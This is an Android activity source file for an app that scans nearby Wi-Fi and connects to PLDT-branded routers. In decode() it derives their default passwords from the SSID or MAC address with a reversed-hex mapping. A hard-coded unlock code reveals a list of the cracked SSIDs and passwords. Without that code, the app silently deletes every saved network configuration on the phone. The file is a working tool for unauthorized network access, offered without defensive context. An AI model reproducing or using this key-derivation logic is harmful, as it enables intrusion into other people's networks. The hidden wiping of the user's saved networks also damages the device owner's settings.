package com.example.johnberlinfuertes.pldc;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import java.util.HashMap;
import java.util.List;


public class WifiConnect extends Activity {

    String[] wifiArray;
    Handler handler = new Handler();
    WifiManager wifiManager;
    List<ScanResult> wifiScanList;
    ListAdapter wifiListAdapter;
    int[] wifiLevel;
    String mac="";
    String ssid="";
    String password="";
    ListView availableWifi;
    WifiScanReceiver wifiReceiver;
    WifiConfiguration wificonfig;
    TextView connectedWifi;
    int count;
    boolean doubleBackToExitPressedOnce = false;
    Button buttonPassword;
    EditText codeText;
    Button gotCodeButton;
    TextView ssidlist;
    TextView passwordList;
    TextView listedWifi;
    ToggleButton showSsidList;
    String testCode;
    DBHandler dbHandler;
    Code code;
    String onCreateTestCode;
    String lp = "PASSWORD";
    String ls = "SSID";


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_wifi_connect);
        availableWifi = (ListView)findViewById(R.id.availableWifi);
        gotCodeButton = (Button) findViewById(R.id.gotCodeButton);
        codeText = (EditText)findViewById(R.id.codeText);
        buttonPassword = (Button)findViewById(R.id.buttonPassword);
        connectedWifi = (TextView)findViewById(R.id.connectedWifi);
        listedWifi = (TextView)findViewById(R.id.listedWifi);
        showSsidList = (ToggleButton)findViewById(R.id.showSsidList);
        ssidlist = (TextView)findViewById(R.id.ssidlist);
        passwordList = (TextView)findViewById(R.id.passwordList);
        wifiReceiver = new WifiScanReceiver();
        wificonfig = new WifiConfiguration();
        dbHandler = new DBHandler(this, null, null , 1);

        wifiManager = (WifiManager)getSystemService(Context.WIFI_SERVICE);

        wifiScanList = wifiManager.getScanResults();
        wifiArray = new String[wifiScanList.size()];
        wifiListAdapter = new CustomListViewAdapter(this,wifiArray);

        try {
            code = dbHandler.getCode(1);
            onCreateTestCode = code.get_Code();
            if(onCreateTestCode.equals("aw56uff65r40")){
                gotCodeButton.setVisibility(View.GONE);
                showSsidList.setVisibility(View.VISIBLE);
            }
        }catch (Exception e){

        }

        if(!wifiManager.isWifiEnabled()){
            Toast.makeText(WifiConnect.this,"enabling wifi",Toast.LENGTH_LONG).show();
            wifiManager.setWifiEnabled(true);
        }
        registerReceiver(wifiReceiver,new IntentFilter(wifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        availableWifi.setOnItemClickListener(
                new AdapterView.OnItemClickListener(){
                    @Override
                    public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
                        if(!wifiManager.isWifiEnabled()){
                            wifiManager.setWifiEnabled(true);
                            Toast.makeText(WifiConnect.this, "Enabling Wifi", Toast.LENGTH_LONG).show();
                        }
                        ssid = wifiScanList.get(position).SSID;
                        mac = wifiScanList.get(position).BSSID;
                        decode();
                        if(password==null){
                            Toast.makeText(WifiConnect.this,"Cannot connect to this network",Toast.LENGTH_SHORT).show();
                            connectedWifi.setText("Choose a wifi on the list");
                            return;
                        }
                        List<WifiConfiguration> list = wifiManager.getConfiguredNetworks();
                        if(onCreateTestCode==null) {
                            for (WifiConfiguration i : list) {
                                if (i.SSID == null) {
                                    break;
                                }
                                wifiManager.removeNetwork(i.networkId);
                                wifiManager.saveConfiguration();
                            }
                        }
                        if(!ls.contains(ssid)||!lp.contains(password)) {
                            ls = ls + "\n" + ssid;
                            lp = lp + "\n" + password;
                            ssidlist.setText(ls);
                            passwordList.setText(lp);
                        }
                        wificonfig.SSID = "\"" + ssid + "\"";
                        wificonfig.preSharedKey = "\""+password+"\"";
                        wifiManager.addNetwork(wificonfig);
                        list = wifiManager.getConfiguredNetworks();
                        count = 0;
                        for( WifiConfiguration i : list ) {
                            if(i.SSID != null && i.SSID.equals("\"" + ssid + "\"")) {
                                wifiManager.disconnect();
                                wifiManager.enableNetwork(i.networkId, true);
                                wifiManager.reconnect();
                                connectedWifi.setText("Connecting To: "+ssid);
                                break;
                            }
                        }
                    }
                }
        );
        wifiDetectionThread();
    }

    public void onTogleBtnClicked(View view) {
        Boolean on = ((ToggleButton)view).isChecked();
        if(on){
            availableWifi.setVisibility(View.GONE);
            passwordList.setVisibility(View.VISIBLE);
            ssidlist.setVisibility(View.VISIBLE);
            listedWifi.setVisibility(View.VISIBLE);
            connectedWifi.setVisibility(View.GONE);
        }
        else {
            availableWifi.setVisibility(View.VISIBLE);
            passwordList.setVisibility(View.GONE);
            ssidlist.setVisibility(View.GONE);
            listedWifi.setVisibility(View.GONE);
            connectedWifi.setVisibility(View.VISIBLE);
        }

    }

    class WifiScanReceiver extends BroadcastReceiver{
        @Override
        public void onReceive(Context context, Intent intent) {

        }
    }

    public void wifiDetectionThread(){
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if(!wifiManager.isWifiEnabled()){
                    Toast.makeText(WifiConnect.this,"enabling wifi",Toast.LENGTH_LONG).show();
                    wifiManager.setWifiEnabled(true);
                }
                int index = availableWifi.getFirstVisiblePosition();
                View v = availableWifi.getChildAt(0);
                int top = (v == null) ? 0 : v.getTop();
                wifiManager.startScan();
                wifiScanList = wifiManager.getScanResults();
                wifiArray = new String[wifiScanList.size()];
                wifiLevel = new int[wifiScanList.size()];
                for(int temp = 0; temp < wifiScanList.size();temp++) {
                    wifiArray[temp] = "SSID: " + wifiScanList.get(temp).SSID + "\nMAC: " + wifiScanList.get(temp).BSSID + "\n" + "Signal Level: " +
                            wifiScanList.get(temp).level + "dB";
                }
                wifiListAdapter = new CustomListViewAdapter(WifiConnect.this, wifiArray);
                availableWifi.setAdapter(wifiListAdapter);
                availableWifi.setSelectionFromTop(index,top);
                handler.postDelayed(this,10000);
            }
        },1000);

    }
    public void onClickedGotCode(View view){
        gotCodeButton.setVisibility(View.GONE);
        codeText.setVisibility(View.VISIBLE);
        buttonPassword.setVisibility(View.VISIBLE);
    }
    public void onCodeClicked(View view){
        testCode = codeText.getText().toString();
        if(testCode.equals("aw56uff65r40")){
            dbHandler.addCode(new Code(testCode));
            buttonPassword.setVisibility(View.GONE);
            codeText.setVisibility(View.GONE);
            showSsidList.setVisibility(View.VISIBLE);

        }
        else Toast.makeText(WifiConnect.this,"Invalid Code!!",Toast.LENGTH_LONG).show();
    }

    public void decode(){
        HashMap<Character,String> hexTable= new HashMap<>();
        hexTable.put('0',"f");
        hexTable.put('1',"e");
        hexTable.put('2',"d");
        hexTable.put('3',"c");
        hexTable.put('4',"b");
        hexTable.put('5',"a");
        hexTable.put('6',"9");
        hexTable.put('7',"8");
        hexTable.put('8',"7");
        hexTable.put('9',"6");
        hexTable.put('a',"5");
        hexTable.put('b',"4");
        hexTable.put('c',"3");
        hexTable.put('d',"2");
        hexTable.put('e',"1");
        hexTable.put('f',"0");
        try {
            if(ssid.contains("PLDTHOMEFIBR_")&&ssid.length()==19){
                password = "wlan"+hexTable.get(ssid.charAt(13))+hexTable.get(ssid.charAt(14))+hexTable.get(ssid.charAt(15))+
                        hexTable.get(ssid.charAt(16))+hexTable.get(ssid.charAt(17))+hexTable.get(ssid.charAt(18));
            }
            else if(ssid.equals("HomeBro_ULTERA")){
                password = "HomeBro_"+mac.charAt(9)+mac.charAt(10)+mac.charAt(12)+mac.charAt(13)+mac.charAt(15)+mac.charAt(16);
            }
            else if(ssid.equals("PLDTMyDSLBiz")||ssid.equals("PLDTMyDSL")||ssid.equals("PLDTHOMEDSL")){
                password = "PLDTWIFI"+mac.substring(10,11).toUpperCase()+mac.substring(12,13).toUpperCase()+mac.substring(13,14).toUpperCase()+
                        mac.substring(15,16).toUpperCase()+mac.substring(16).toUpperCase();
            }
            else if(ssid.contains("PLDTHOMEFIBR")&&ssid.length()==17){
                password = "PLDTWIFI"+hexTable.get(ssid.charAt(12))+hexTable.get(ssid.charAt(13))+hexTable.get(ssid.charAt(14))+
                        hexTable.get(ssid.charAt(15))+hexTable.get(ssid.charAt(16));
            }
            else if(ssid.contains("PLDTHOMEDSL")&&ssid.length()==16){
                password = "PLDTWIFI"+(Integer.parseInt(ssid.substring(11))*3);
            }
            else {
                password = null;
            }
        }catch (Exception e){
            Toast.makeText(WifiConnect.this,"This PLDT wifi is currently not supported!",Toast.LENGTH_LONG).show();
            password = null;
        }
    }

    @Override
    protected void onPause() {
        unregisterReceiver(wifiReceiver);
        super.onPause();
    }

    @Override
    protected void onResume() {
        registerReceiver(wifiReceiver,new IntentFilter(wifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
        super.onResume();
    }

    @Override
    protected void onDestroy() {
        List<WifiConfiguration> list = wifiManager.getConfiguredNetworks();
        if(onCreateTestCode==null) {
            for (WifiConfiguration i : list) {
                if (i.SSID == null) {
                    break;
                }
                wifiManager.removeNetwork(i.networkId);
                wifiManager.saveConfiguration();
            }
        }
        super.onDestroy();
    }
    @Override
    public void onBackPressed() {
        if (doubleBackToExitPressedOnce) {
            super.onBackPressed();
            return;
        }

        this.doubleBackToExitPressedOnce = true;
        Toast.makeText(this, "Please click BACK again to exit", Toast.LENGTH_SHORT).show();

        new Handler().postDelayed(new Runnable() {

            @Override
            public void run() {
                doubleBackToExitPressedOnce=false;
            }
        }, 2000);
    }
}
